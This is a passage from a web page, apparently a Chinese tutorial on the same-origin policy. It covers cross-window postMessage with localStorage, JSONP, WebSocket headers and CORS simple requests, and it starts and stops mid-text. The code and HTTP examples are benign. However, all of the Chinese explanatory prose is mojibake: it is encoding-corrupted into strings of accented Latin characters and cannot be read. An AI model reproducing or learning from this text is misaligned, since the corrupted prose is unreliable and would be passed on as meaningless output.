</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>åŠ å¼ºç‰ˆçš„å­çª—å£æ¥æ”¶æ¶ˆæ¯çš„ä»£ç å¦‚ä¸‹ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>origin <span class="token operator">!==</span> <span class="token string">'http://bbb.com'</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> payload <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">switch</span> <span class="token punctuation">(</span>payload<span class="token punctuation">.</span>method<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">case</span> <span class="token string">'set'</span><span class="token operator">:</span>
      localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span>key<span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token string">'get'</span><span class="token operator">:</span>
      <span class="token keyword">var</span> parent <span class="token operator">=</span> window<span class="token punctuation">.</span>parent<span class="token punctuation">;</span>
      <span class="token keyword">var</span> data <span class="token operator">=</span> localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
      parent<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token string">'http://aaa.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token string">'remove'</span><span class="token operator">:</span>
      localStorage<span class="token punctuation">.</span><span class="token function">removeItem</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>åŠ å¼ºç‰ˆçš„çˆ¶çª—å£å‘é€æ¶ˆæ¯ä»£ç å¦‚ä¸‹ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> win <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>contentWindow<span class="token punctuation">;</span>
<span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span> name<span class="token operator">:</span> <span class="token string">'Jack'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token comment">// å­˜å…¥å¯¹è±¡</span>
win<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>
  <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span>key<span class="token operator">:</span> <span class="token string">'storage'</span><span class="token punctuation">,</span> method<span class="token operator">:</span> <span class="token string">'set'</span><span class="token punctuation">,</span> data<span class="token operator">:</span> obj<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token string">'http://bbb.com'</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// è¯»å–å¯¹è±¡</span>
win<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>
  <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span>key<span class="token operator">:</span> <span class="token string">'storage'</span><span class="token punctuation">,</span> method<span class="token operator">:</span> <span class="token string">&quot;get&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token string">&quot;*&quot;</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
window<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>origin <span class="token operator">!=</span> <span class="token string">'http://aaa.com'</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><h2 id="_4-ajax"><a href="#_4-ajax" class="header-anchor">#</a> 4.AJAX</h2> <p>åŒæºæ”¿ç­–è§„å®šï¼ŒAJAX è¯·æ±‚åªèƒ½å‘ç»™åŒæºçš„ç½‘å€ï¼Œå¦åˆ™å°±æŠ¥é”™ã€‚</p> <p>é™¤äº†æ¶è®¾æœåŠ¡å™¨ä»£ç†ï¼ˆæµè§ˆå™¨è¯·æ±‚åŒæºæœåŠ¡å™¨ï¼Œå†ç”±åè€…è¯·æ±‚å¤–éƒ¨æœåŠ¡ï¼‰ï¼Œæœ‰ä¸‰ç§æ–¹æ³•è§„é¿è¿™ä¸ªé™åˆ¶ã€‚</p> <blockquote><ul><li>JSONP</li> <li>WebSocket</li> <li>CORS</li></ul></blockquote> <h3 id="jsonp"><a href="#jsonp" class="header-anchor">#</a> JSONP</h3> <p>JSONP æ˜¯æœåŠ¡å™¨ä¸å®¢æˆ·ç«¯è·¨æºé€šä¿¡çš„å¸¸ç”¨æ–¹æ³•ã€‚æœ€å¤§ç‰¹ç‚¹å°±æ˜¯ç®€å•æ˜“ç”¨ï¼Œæ²¡æœ‰å…¼å®¹æ€§é—®é¢˜ï¼Œè€å¼æµè§ˆå™¨å…¨éƒ¨æ”¯æŒï¼ŒæœåŠ¡ç«¯æ”¹é€ éå¸¸å°ã€‚</p> <p>å®ƒçš„åšæ³•å¦‚ä¸‹ã€‚</p> <p>ç¬¬ä¸€æ­¥ï¼Œç½‘é¡µæ·»åŠ ä¸€ä¸ª<code>&lt;script&gt;</code>å…ƒç´ ï¼Œå‘æœåŠ¡å™¨è¯·æ±‚ä¸€ä¸ªè„šæœ¬ï¼Œè¿™ä¸å—åŒæºæ”¿ç­–é™åˆ¶ï¼Œå¯ä»¥è·¨åŸŸè¯·æ±‚ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>http://api.foo.com?callback=bar<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>æ³¨æ„ï¼Œè¯·æ±‚çš„è„šæœ¬ç½‘å€æœ‰ä¸€ä¸ª<code>callback</code>å‚æ•°ï¼ˆ<code>?callback=bar</code>ï¼‰ï¼Œç”¨æ¥å‘Šè¯‰æœåŠ¡å™¨ï¼Œå®¢æˆ·ç«¯çš„å›è°ƒå‡½æ•°åç§°ï¼ˆ<code>bar</code>ï¼‰ã€‚</p> <p>ç¬¬äºŒæ­¥ï¼ŒæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œæ‹¼æ¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå°† JSON æ•°æ®æ”¾åœ¨å‡½æ•°åé‡Œé¢ï¼Œä½œä¸ºå­—ç¬¦ä¸²è¿”å›ï¼ˆ<code>bar({...})</code>ï¼‰ã€‚</p> <p>ç¬¬ä¸‰æ­¥ï¼Œå®¢æˆ·ç«¯ä¼šå°†æœåŠ¡å™¨è¿”å›çš„å­—ç¬¦ä¸²ï¼Œä½œä¸ºä»£ç è§£æï¼Œå› ä¸ºæµè§ˆå™¨è®¤ä¸ºï¼Œè¿™æ˜¯<code>&lt;script&gt;</code>æ ‡ç­¾è¯·æ±‚çš„è„šæœ¬å†…å®¹ã€‚è¿™æ—¶ï¼Œå®¢æˆ·ç«¯åªè¦å®šä¹‰äº†<code>bar()</code>å‡½æ•°ï¼Œå°±èƒ½åœ¨è¯¥å‡½æ•°ä½“å†…ï¼Œæ‹¿åˆ°æœåŠ¡å™¨è¿”å›çš„ JSON æ•°æ®ã€‚</p> <p>ä¸‹é¢çœ‹ä¸€ä¸ªå®ä¾‹ã€‚é¦–å…ˆï¼Œç½‘é¡µåŠ¨æ€æ’å…¥<code>&lt;script&gt;</code>å…ƒç´ ï¼Œç”±å®ƒå‘è·¨åŸŸç½‘å€å‘å‡ºè¯·æ±‚ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token function">addScriptTag</span><span class="token punctuation">(</span><span class="token parameter">src</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  script<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'type'</span><span class="token punctuation">,</span> <span class="token string">'text/javascript'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  script<span class="token punctuation">.</span>src <span class="token operator">=</span> src<span class="token punctuation">;</span>
  document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">addScriptTag</span><span class="token punctuation">(</span><span class="token string">'http://example.com/ip?callback=foo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Your public IP address is: '</span> <span class="token operator">+</span> data<span class="token punctuation">.</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>ä¸Šé¢ä»£ç é€šè¿‡åŠ¨æ€æ·»åŠ <code>&lt;script&gt;</code>å…ƒç´ ï¼Œå‘æœåŠ¡å™¨<code>example.com</code>å‘å‡ºè¯·æ±‚ã€‚æ³¨æ„ï¼Œè¯¥è¯·æ±‚çš„æŸ¥è¯¢å­—ç¬¦ä¸²æœ‰ä¸€ä¸ª<code>callback</code>å‚æ•°ï¼Œç”¨æ¥æŒ‡å®šå›è°ƒå‡½æ•°çš„åå­—ï¼Œè¿™å¯¹äº JSONP æ˜¯å¿…éœ€çš„ã€‚</p> <p>æœåŠ¡å™¨æ”¶åˆ°è¿™ä¸ªè¯·æ±‚ä»¥åï¼Œä¼šå°†æ•°æ®æ”¾åœ¨å›è°ƒå‡½æ•°çš„å‚æ•°ä½ç½®è¿”å›ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  <span class="token string">'ip'</span><span class="token operator">:</span> <span class="token string">'8.8.8.8'</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>ç”±äº<code>&lt;script&gt;</code>å…ƒç´ è¯·æ±‚çš„è„šæœ¬ï¼Œç›´æ¥ä½œä¸ºä»£ç è¿è¡Œã€‚è¿™æ—¶ï¼Œåªè¦æµè§ˆå™¨å®šä¹‰äº†<code>foo</code>å‡½æ•°ï¼Œè¯¥å‡½æ•°å°±ä¼šç«‹å³è°ƒç”¨ã€‚ä½œä¸ºå‚æ•°çš„ JSON æ•°æ®è¢«è§†ä¸º JavaScript å¯¹è±¡ï¼Œè€Œä¸æ˜¯å­—ç¬¦ä¸²ï¼Œå› æ­¤é¿å…äº†ä½¿ç”¨<code>JSON.parse</code>çš„æ­¥éª¤ã€‚</p> <h3 id="websocket"><a href="#websocket" class="header-anchor">#</a> WebSocket</h3> <p>WebSocket æ˜¯ä¸€ç§é€šä¿¡åè®®ï¼Œä½¿ç”¨<code>ws://</code>ï¼ˆéåŠ å¯†ï¼‰å’Œ<code>wss://</code>ï¼ˆåŠ å¯†ï¼‰ä½œä¸ºåè®®å‰ç¼€ã€‚è¯¥åè®®ä¸å®è¡ŒåŒæºæ”¿ç­–ï¼Œåªè¦æœåŠ¡å™¨æ”¯æŒï¼Œå°±å¯ä»¥é€šè¿‡å®ƒè¿›è¡Œè·¨æºé€šä¿¡ã€‚</p> <p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œæµè§ˆå™¨å‘å‡ºçš„ WebSocket è¯·æ±‚çš„å¤´ä¿¡æ¯ï¼ˆæ‘˜è‡ª<a href="https://en.wikipedia.org/wiki/WebSocket" target="_blank" rel="noopener noreferrer">ç»´åŸºç™¾ç§‘<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>ï¼‰ã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token property">GET</span> /chat HTTP/1.1</span>
<span class="token header-name keyword">Host:</span> server.example.com
<span class="token header-name keyword">Upgrade:</span> websocket
<span class="token header-name keyword">Connection:</span> Upgrade
<span class="token header-name keyword">Sec-WebSocket-Key:</span> x3JJHMbDL1EzLkh9GBhXDw==
<span class="token header-name keyword">Sec-WebSocket-Protocol:</span> chat, superchat
<span class="token header-name keyword">Sec-WebSocket-Version:</span> 13
<span class="token header-name keyword">Origin:</span> http://example.com

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œæœ‰ä¸€ä¸ªå­—æ®µæ˜¯<code>Origin</code>ï¼Œè¡¨ç¤ºè¯¥è¯·æ±‚çš„è¯·æ±‚æºï¼ˆoriginï¼‰ï¼Œå³å‘è‡ªå“ªä¸ªåŸŸåã€‚</p> <p>æ­£æ˜¯å› ä¸ºæœ‰äº†<code>Origin</code>è¿™ä¸ªå­—æ®µï¼Œæ‰€ä»¥ WebSocket æ‰æ²¡æœ‰å®è¡ŒåŒæºæ”¿ç­–ã€‚å› ä¸ºæœåŠ¡å™¨å¯ä»¥æ ¹æ®è¿™ä¸ªå­—æ®µï¼Œåˆ¤æ–­æ˜¯å¦è®¸å¯æœ¬æ¬¡é€šä¿¡ã€‚å¦‚æœè¯¥åŸŸååœ¨ç™½åå•å†…ï¼ŒæœåŠ¡å™¨å°±ä¼šåšå‡ºå¦‚ä¸‹å›åº”ã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token response-status">HTTP/1.1 <span class="token property">101 Switching Protocols</span></span>
<span class="token header-name keyword">Upgrade:</span> websocket
<span class="token header-name keyword">Connection:</span> Upgrade
<span class="token header-name keyword">Sec-WebSocket-Accept:</span> HSmrc0sMlYUkAGmm5OPpG2HaGWk=
<span class="token header-name keyword">Sec-WebSocket-Protocol:</span> chat

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h3 id="cors"><a href="#cors" class="header-anchor">#</a> CORS</h3> <p>CORS æ˜¯è·¨æºèµ„æºåˆ†äº«ï¼ˆCross-Origin Resource Sharingï¼‰çš„ç¼©å†™ã€‚å®ƒæ˜¯ W3C æ ‡å‡†ï¼Œå±äºè·¨æº AJAX è¯·æ±‚çš„æ ¹æœ¬è§£å†³æ–¹æ³•ã€‚ç›¸æ¯” JSONP åªèƒ½å‘<code>GET</code>è¯·æ±‚ï¼ŒCORS å…è®¸ä»»ä½•ç±»å‹çš„è¯·æ±‚ã€‚</p> <h2 id="å…­ã€cors-é€šä¿¡"><a href="#å…­ã€cors-é€šä¿¡" class="header-anchor">#</a> å…­ã€CORS é€šä¿¡</h2> <p>CORS æ˜¯ä¸€ä¸ª W3C æ ‡å‡†ï¼Œå…¨ç§°æ˜¯â€œè·¨åŸŸèµ„æºå…±äº«â€ï¼ˆCross-origin resource sharingï¼‰ã€‚å®ƒå…è®¸æµè§ˆå™¨å‘è·¨åŸŸçš„æœåŠ¡å™¨ï¼Œå‘å‡º<code>XMLHttpRequest</code>è¯·æ±‚ï¼Œä»è€Œå…‹æœäº† AJAX åªèƒ½åŒæºä½¿ç”¨çš„é™åˆ¶ã€‚</p> <h2 id="_1-ç®€ä»‹-2"><a href="#_1-ç®€ä»‹-2" class="header-anchor">#</a> 1.ç®€ä»‹</h2> <p>CORS éœ€è¦æµè§ˆå™¨å’ŒæœåŠ¡å™¨åŒæ—¶æ”¯æŒã€‚ç›®å‰ï¼Œæ‰€æœ‰æµè§ˆå™¨éƒ½æ”¯æŒè¯¥åŠŸèƒ½ã€‚</p> <p>æ•´ä¸ª CORS é€šä¿¡è¿‡ç¨‹ï¼Œéƒ½æ˜¯æµè§ˆå™¨è‡ªåŠ¨å®Œæˆï¼Œä¸éœ€è¦ç”¨æˆ·å‚ä¸ã€‚å¯¹äºå¼€å‘è€…æ¥è¯´ï¼ŒCORS é€šä¿¡ä¸æ™®é€šçš„ AJAX é€šä¿¡æ²¡æœ‰å·®åˆ«ï¼Œä»£ç å®Œå…¨ä¸€æ ·ã€‚æµè§ˆå™¨ä¸€æ—¦å‘ç° AJAX è¯·æ±‚è·¨åŸŸï¼Œå°±ä¼šè‡ªåŠ¨æ·»åŠ ä¸€äº›é™„åŠ çš„å¤´ä¿¡æ¯ï¼Œæœ‰æ—¶è¿˜ä¼šå¤šå‡ºä¸€æ¬¡é™„åŠ çš„è¯·æ±‚ï¼Œä½†ç”¨æˆ·ä¸ä¼šæœ‰æ„ŸçŸ¥ã€‚å› æ­¤ï¼Œå®ç° CORS é€šä¿¡çš„å…³é”®æ˜¯æœåŠ¡å™¨ã€‚åªè¦æœåŠ¡å™¨å®ç°äº† CORS æ¥å£ï¼Œå°±å¯ä»¥è·¨åŸŸé€šä¿¡ã€‚</p> <h2 id="_2-ä¸¤ç§è¯·æ±‚"><a href="#_2-ä¸¤ç§è¯·æ±‚" class="header-anchor">#</a> 2.ä¸¤ç§è¯·æ±‚</h2> <p>CORS è¯·æ±‚åˆ†æˆä¸¤ç±»ï¼šç®€å•è¯·æ±‚ï¼ˆsimple requestï¼‰å’Œéç®€å•è¯·æ±‚ï¼ˆnot-so-simple requestï¼‰ã€‚</p> <p>åªè¦åŒæ—¶æ»¡è¶³ä»¥ä¸‹ä¸¤å¤§æ¡ä»¶ï¼Œå°±å±äºç®€å•è¯·æ±‚ã€‚</p> <p>ï¼ˆ1ï¼‰è¯·æ±‚æ–¹æ³•æ˜¯ä»¥ä¸‹ä¸‰ç§æ–¹æ³•ä¹‹ä¸€ã€‚</p> <blockquote><ul><li>HEAD</li> <li>GET</li> <li>POST</li></ul></blockquote> <p>ï¼ˆ2ï¼‰HTTP çš„å¤´ä¿¡æ¯ä¸è¶…å‡ºä»¥ä¸‹å‡ ç§å­—æ®µã€‚</p> <blockquote><ul><li>Accept</li> <li>Accept-Language</li> <li>Content-Language</li> <li>Last-Event-ID</li> <li>Content-Typeï¼šåªé™äºä¸‰ä¸ªå€¼<code>application/x-www-form-urlencoded</code>ã€<code>multipart/form-data</code>ã€<code>text/plain</code></li></ul></blockquote> <p>å‡¡æ˜¯ä¸åŒæ—¶æ»¡è¶³ä¸Šé¢ä¸¤ä¸ªæ¡ä»¶ï¼Œå°±å±äºéç®€å•è¯·æ±‚ã€‚ä¸€å¥è¯ï¼Œç®€å•è¯·æ±‚å°±æ˜¯ç®€å•çš„ HTTP æ–¹æ³•ä¸ç®€å•çš„ HTTP å¤´ä¿¡æ¯çš„ç»“åˆã€‚</p> <p>è¿™æ ·åˆ’åˆ†çš„åŸå› æ˜¯ï¼Œè¡¨å•åœ¨å†å²ä¸Šä¸€ç›´å¯ä»¥è·¨åŸŸå‘å‡ºè¯·æ±‚ã€‚ç®€å•è¯·æ±‚å°±æ˜¯è¡¨å•è¯·æ±‚ï¼Œæµè§ˆå™¨æ²¿è¢­äº†ä¼ ç»Ÿçš„å¤„ç†æ–¹å¼ï¼Œä¸æŠŠè¡Œä¸ºå¤æ‚åŒ–ï¼Œå¦åˆ™å¼€å‘è€…å¯èƒ½è½¬è€Œä½¿ç”¨è¡¨å•ï¼Œè§„é¿ CORS çš„é™åˆ¶ã€‚å¯¹äºéç®€å•è¯·æ±‚ï¼Œæµè§ˆå™¨ä¼šé‡‡ç”¨æ–°çš„å¤„ç†æ–¹å¼ã€‚</p> <h2 id="_3-ç®€å•è¯·æ±‚"><a href="#_3-ç®€å•è¯·æ±‚" class="header-anchor">#</a> 3.ç®€å•è¯·æ±‚</h2> <h3 id="åŸºæœ¬æµç¨‹"><a href="#åŸºæœ¬æµç¨‹" class="header-anchor">#</a> åŸºæœ¬æµç¨‹</h3> <p>å¯¹äºç®€å•è¯·æ±‚ï¼Œæµè§ˆå™¨ç›´æ¥å‘å‡º CORS è¯·æ±‚ã€‚å…·ä½“æ¥è¯´ï¼Œå°±æ˜¯åœ¨å¤´ä¿¡æ¯ä¹‹ä¸­ï¼Œå¢åŠ ä¸€ä¸ª<code>Origin</code>å­—æ®µã€‚</p> <p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œæµè§ˆå™¨å‘ç°è¿™æ¬¡è·¨åŸŸ AJAX è¯·æ±‚æ˜¯ç®€å•è¯·æ±‚ï¼Œå°±è‡ªåŠ¨åœ¨å¤´ä¿¡æ¯ä¹‹ä¸­ï¼Œæ·»åŠ ä¸€ä¸ª<code>Origin</code>å­—æ®µã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token property">GET</span> /cors HTTP/1.1</span>
<span class="token header-name keyword">Origin:</span> http://api.bob.com
<span class="token header-name keyword">Host:</span> api.alice.com
<span class="token header-name keyword">Accept-Language:</span> en-US
<span class="token header-name keyword">Connection:</span> keep-alive
<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0...
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>ä¸Šé¢çš„å¤´ä¿¡æ¯ä¸­ï¼Œ<code>Origin</code>å­—æ®µç”¨æ¥è¯´æ˜ï¼Œæœ¬æ¬¡è¯·æ±‚æ¥è‡ªå“ªä¸ªåŸŸï¼ˆåè®® + åŸŸå + ç«¯å£ï¼‰ã€‚æœåŠ¡å™¨æ ¹æ®è¿™ä¸ªå€¼ï¼Œå†³å®šæ˜¯å¦åŒæ„è¿™æ¬¡è¯·æ±‚ã€‚</p> <p>å¦‚æœ<code>Origin</code>æŒ‡å®šçš„æºï¼Œä¸åœ¨è®¸å¯èŒƒå›´å†…ï¼ŒæœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªæ­£å¸¸çš„ HTTP å›åº”ã€‚æµè§ˆå™¨å‘ç°ï¼Œè¿™ä¸ªå›åº”çš„å¤´ä¿¡æ¯æ²¡æœ‰åŒ…å«<code>Access-Control-Allow-Origin</code>å­—æ®µï¼ˆè¯¦è§ä¸‹æ–‡ï¼‰ï¼Œå°±çŸ¥é“å‡ºé”™äº†ï¼Œä»è€ŒæŠ›å‡ºä¸€ä¸ªé”™è¯¯ï¼Œè¢«<code>XMLHttpRequest</code>çš„<code>onerror</code>å›è°ƒå‡½æ•°æ•è·ã€‚æ³¨æ„ï¼Œè¿™ç§é”™è¯¯æ— æ³•é€šè¿‡çŠ¶æ€ç è¯†åˆ«ï¼Œå› ä¸º HTTP å›åº”çš„çŠ¶æ€ç æœ‰å¯èƒ½æ˜¯200ã€‚</p> <p>å¦‚æœ<code>Origin</code>æŒ‡å®šçš„åŸŸååœ¨è®¸å¯èŒƒå›´å†…ï¼ŒæœåŠ¡å™¨è¿”å›çš„å“åº”ï¼Œä¼šå¤šå‡ºå‡ ä¸ªå¤´ä¿¡æ¯å­—æ®µã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">Access-Control-Allow-Origin:</span> http://api.bob.com
<span class="token header-name keyword">Access-Control-Allow-Credentials:</span> true
<span class="token header-name keyword">Access-Control-Expose-Headers:</span> FooBar
<span class="token header-name keyword">Content-Type:</span> text/html; charset=utf-8
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>ä¸Šé¢çš„å¤´ä¿¡æ¯ä¹‹ä¸­ï¼Œæœ‰ä¸‰ä¸ªä¸ CORS è¯·æ±‚ç›¸å…³çš„å­—æ®µï¼Œéƒ½ä»¥<code>Access-Control-</code>å¼€å¤´ã€‚</p> <p><strong>ï¼ˆ1ï¼‰<code>Access-Control-Allow-Origin</code></strong></p> <p>è¯¥å­—æ®µæ˜¯å¿…é¡»çš„ã€‚å®ƒçš„å€¼è¦ä¹ˆæ˜¯è¯·æ±‚æ—¶<code>Origin</code>å­—æ®µçš„å€¼ï¼Œè¦ä¹ˆæ˜¯ä¸€ä¸ª<code>*</code>ï¼Œè¡¨ç¤ºæ¥å—ä»»æ„åŸŸåçš„è¯·æ±‚ã€‚</p> <p><strong>ï¼ˆ2ï¼‰<code>Access-Control-Allow-Credentials</code></strong></p> <p>è¯¥å­—æ®µå¯é€‰ã€‚å®ƒçš„å€¼æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ˜¯å¦å…è®¸å‘é€ Cookieã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒCookie ä¸åŒ…æ‹¬åœ¨ CORS 